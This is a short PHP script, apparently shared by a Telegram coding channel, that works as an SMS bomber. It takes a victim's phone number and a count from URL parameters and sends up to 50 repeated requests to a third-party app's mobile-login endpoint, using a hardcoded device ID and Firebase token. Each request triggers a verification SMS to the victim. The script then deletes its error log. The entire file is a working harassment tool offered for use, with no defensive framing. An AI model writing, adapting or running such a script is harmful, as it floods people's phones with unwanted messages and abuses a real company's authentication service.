<?php
/////////////////////////////////////////////////////////////////////////
//------------------------
// Channel : @LintoCode
// Developer : @DevMrAmir
//------------------------/////////////////////////////////////////////////////////////////////////
$PhoneNumber = $_GET['phonenumber'];
$SetSpam = $_GET['setspam'];
$field = json_encode(['deviceId'=>"b09df731ffd613a5","firebaseId"=>"fdPz8h8oo5g:APA91bEmK9-EUXt-FsQ1CGIIVBZkAjm4Cd25Si86dxzHuRxcUASTh8hUlvkhFmwoWW2eY9rwAC2Jm6xqXOcKQDuz_0v8TRsdwiBQqyeI516Tt3cshCNi24KVIYqRgAxueQ7youcrHAAi","mobile"=>$PhoneNumber,"oneSignalId"=>"id"]);
/////////////////////////////////////////////////////////////////////////
if(isset($PhoneNumber) && isset($SetSpam)){
if(is_numeric($PhoneNumber) && is_numeric($SetSpam)){
if($SetSpam <= 50){
For($n=1; $n <= $SetSpam; $n++){
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL,"http://api.pikato.net/users/mobile-login");
curl_setopt($curl,CURLOPT_POST,true);
curl_setopt($curl,CURLOPT_POSTFIELDS,$field);
curl_setopt($curl,CURLOPT_HTTPHEADER,array("Application: pikatoMobilePrz"));
curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);
curl_exec($curl);
}
echo json_encode(["condition"=>true,"result"=>"$SetSpam sms sended"]);
}else{
echo json_encode(["condition"=>false,"result"=>"Parameter setspam must be 50 or less than 50"]);
}}else{
echo json_encode(["condition"=>false,"result"=>"Parameter setspam and phonenumber Must be a number"]);
}}else{
echo json_encode(["condition"=>false,"result"=>"Parameter setspam or phonenumber or both is null"]);
}
/////////////////////////////////////////////////////////////////////////
if(is_file("error_log")){
unlink("error_log");
}
/////////////////////////////////////////////////////////////////////////
//------------------------
// Channel : @LintoCode
// Developer : @DevMrAmir
//------------------------/////////////////////////////////////////////////////////////////////////
?>